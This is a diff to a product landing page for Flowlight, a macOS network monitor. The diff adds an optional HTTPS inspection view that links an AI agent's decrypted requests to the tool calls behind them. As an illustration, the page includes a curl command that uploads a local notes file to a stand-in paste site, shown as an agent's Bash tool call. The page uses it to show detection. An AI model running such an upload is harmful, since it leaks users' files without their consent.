@@ -12,7 +12,7 @@ nav: home
         <h1 style="margin-top:16px">Every app. Every domain. <span class="flow">Every agent.</span></h1>
         <p class="lede">Flowlight shows which app on your Mac talked to which domain, over which protocol, and how much it sent.
           It keeps a closer eye on AI agents, so an email, an SSH session or a 180&nbsp;MB upload you never asked for
-          doesn't go unnoticed.</p>
+          doesn't go unnoticed. Turn on HTTPS inspection and you see the tool calls behind it, too.</p>
         <div class="cta">
           <a class="btn btn-primary" href="{{dmg}}">
             <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 4v11m0 0-4.5-4.5M12 15l4.5-4.5M5 20h14"/></svg>
@@ -80,7 +80,7 @@ nav: home
     <div class="wrap">
       <div class="section-head">
         <p class="eyebrow">Inside the app</p>
-        <h2>Four views, one question each</h2>
+        <h2>Five views, one question each</h2>
       </div>
       <div class="views">
         <div class="view-card"><span class="glyph live"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M3 12h4l3-8 4 16 3-8h4"/></svg></span>
@@ -91,6 +91,8 @@ nav: home
           <h3>Reports</h3><p>Where did it all go? Second to year, grouped by app, destination or IP, with charts and CSV.</p><span class="keys">⌘3</span></div>
         <div class="view-card"><span class="glyph alerts"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 3 2 20h20L12 3z"/><path d="M12 10v4M12 17.5v.01"/></svg></span>
           <h3>Alerts</h3><p>What looked wrong? Explainable, per-app alerts with the destination and the threshold.</p><span class="keys">⌘4</span></div>
+        <div class="view-card"><span class="glyph inspect"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect x="3" y="4" width="18" height="12" rx="2"/><path d="M8 20h8M12 16v4"/><path d="M10 10a2 2 0 1 1 4 0v1"/></svg></span>
+          <h3>Inspect</h3><p>Optional. What did the agent actually send, and which tool call made it? Decrypted requests, tool calls, results.</p><span class="keys">⌘5</span></div>
       </div>
     </div>
   </section>
@@ -155,7 +157,7 @@ nav: home
         <div class="rule">
           <span class="sev info">⌕ Opt-in</span>
           <div><h3>Tool calls, from the model's own responses</h3>
-            <p>Turn on HTTPS inspection and Flowlight reads every tool call the model asks an agent to run, then ties each tool's request back to the call that caused it.</p>
+            <p>Turn on HTTPS inspection and Flowlight reads every tool call the model asks an agent to run and the result that came back, then ties each tool's request back to the call that caused it.</p>
             <p class="example">curl → paste.example:443 &nbsp;←&nbsp; Bash: curl -s https://paste.example/up -d @notes.txt</p></div>
         </div>
         <div class="rule">
@@ -247,6 +249,7 @@ nav: home
             <tr><td>Which domain it went to</td><td class="us yes">Yes, from SNI and DNS</td><td class="no">No</td><td class="yes">Yes</td><td class="yes">Yes, per packet</td></tr>
             <tr><td>History from second to year</td><td class="us yes">Yes</td><td class="no">No</td><td class="part">Varies</td><td class="part">Capture files</td></tr>
             <tr><td>Rules for AI agents</td><td class="us yes">Yes</td><td class="no">No</td><td class="no">No</td><td class="no">No</td></tr>
+            <tr><td>An agent's tool calls, tied to its traffic</td><td class="us yes">Yes, opt-in</td><td class="no">No</td><td class="no">No</td><td class="no">No</td></tr>
             <tr><td>Blocks connections</td><td class="us no">No, observe only</td><td class="no">No</td><td class="yes">Yes</td><td class="no">No</td></tr>
             <tr><td>Free and open source</td><td class="us yes">Yes, GPL-3.0</td><td class="part">Built in</td><td class="part">Varies</td><td class="yes">Yes</td></tr>
           </tbody>
@@ -271,6 +274,28 @@ nav: home
       </div>
     </div>
   </section>
+<section class="band" id="inspect">
+    <div class="wrap">
+      <div class="section-head">
+        <p class="eyebrow">HTTPS inspection · optional</p>
+        <h2>See the tool call behind every request</h2>
+        <p class="lede">Off by default. Turn it on and Flowlight becomes a local proxy with its own certificate authority, created on your
+          Mac. Start an agent from an inspected Terminal and every request it and its tools make is decrypted, with the tool calls the
+          model asked for and the results that went back.</p>
+      </div>
+      <figure class="detail-shot"><div class="frame"><img src="{{root}}assets/screenshots/inspect.png" width="1600" height="1075" loading="lazy"
+        alt="Flowlight's Inspect view: a list of decrypted Claude Code requests with their tool calls, and the detail of curl's upload to paste.example, made by the Bash tool call that ran it, with the uploaded notes in the request body"></div>
+        <figcaption><b>Where did my notes go?</b> curl's upload to paste.example, traced to the Bash command the model asked for, with the
+          body it sent.</figcaption></figure>
+      <div class="privacy" style="margin-top:32px">
+        <div><strong>Tool calls and results</strong><p>Anthropic, OpenAI, Gemini and MCP. Each call with its command, its output or error, and the requests its tool made.</p></div>
+        <div><strong>MCP servers</strong><p>Name, version, local or remote, the tools each one offers, and how often they were called or failed.</p></div>
+        <div><strong>Readable bodies</strong><p>JSON as a collapsible tree in its original order, streams one event at a time, headers and raw view.</p></div>
+        <div><strong>On your terms</strong><p>AI agents only by default. Apple services and password managers are never decrypted, credentials never stored, and one button removes it all.</p></div>
+      </div>
+    </div>
+  </section>
+
 <section class="band" id="privacy">
     <div class="wrap">
       <div class="section-head">
@@ -288,10 +313,11 @@ nav: home
 
   <section class="band" id="agent-detail" aria-label="Agent detail screenshot">
     <div class="wrap">
-      <figure class="detail-shot"><div class="frame"><img src="{{root}}assets/screenshots/agent-detail.png" width="1600" height="588" loading="lazy"
-        alt="Claude Code's detail in Flowlight: git, the github MCP server and curl listed under Tools and MCP servers, an allowlist of github.com, npmjs.org and githubusercontent.com, and two destinations marked Not allowed with an Allow button"></div>
-        <figcaption><b>One agent, all its tools.</b> Traffic from the git, curl and MCP servers Claude Code started is counted as Claude Code's,
-          labelled <em>via curl</em> or <em>via github MCP</em>. With an allowlist of GitHub and npm, the SMTP relay and the paste site stand out as <em>Not allowed</em>.</figcaption></figure>
+      <figure class="detail-shot"><div class="frame"><img src="{{root}}assets/screenshots/agent-detail.png" width="1600" height="622" loading="lazy"
+        alt="Claude Code's detail in Flowlight: Tools and MCP servers with call counts and one failure, an allowlist, and the Tool calls tab listing a failed git push, a curl upload to paste.example with its response and request, npm install, a GitHub issue, a docs search and a file read, each with its result"></div>
+        <figcaption><b>One agent, every tool call.</b> Traffic from the git, curl and MCP servers Claude Code started counts as Claude Code's.
+          With HTTPS inspection on, the <em>Tool calls</em> tab shows what the model asked for, what came back, and the requests each tool made:
+          the curl upload to paste.example, and the git push that failed.</figcaption></figure>
     </div>
   </section>
 
